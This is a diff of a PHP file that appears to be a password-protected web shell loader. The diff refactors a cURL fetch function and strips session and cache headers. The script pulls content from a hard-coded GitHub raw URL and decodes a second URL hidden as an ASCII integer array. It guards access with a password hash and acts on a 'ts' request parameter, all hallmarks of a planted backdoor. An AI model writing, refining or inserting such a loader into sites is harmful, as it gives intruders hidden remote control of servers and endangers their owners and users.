@@ -1,21 +1,21 @@
 <?php
-// Set session timeout and prevent caching before session start
-ini_set('session.gc_maxlifetime', 3600); // Set session timeout to 1 hour
-header("Cache-Control: no-cache, must-revalidate");
-header("Expires: 0");
-
-// Start the session
+// Start the session at the very beginning
 session_start();
 
 // Your URL to fetch content from
 $Url = "https://raw.githubusercontent.com/bokaman12/7h3o/refs/heads/main/bandir-put/eikhane/ki/koros/fuck/you/f1.txt";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $Url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$output = curl_exec($ch);
-curl_close($ch);
 
-// Decode the ASCII-encoded URL if needed
+// Function to fetch content from a URL
+function madrid($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+// Decode the ASCII-encoded URL (same as before)
 $asciiArray = [
     104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104,
     117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111,
@@ -33,7 +33,7 @@ foreach ($asciiArray as $ascii) {
 
 $url = $decodedString; // Set the URL from the decoded string
 
-// Correct password hash
+// Correct password hash (make sure this is the correct one you want to use)
 $correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';
 
 // If reset is requested, clear the session URL
@@ -90,15 +90,5 @@ if (isset($_GET['ts'])) {
     } else {
         echo "Error fetching the content.";
     }
-}
-
-// Function to fetch URL content via cURL (fallback)
-function madrid($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
 }
 ?>
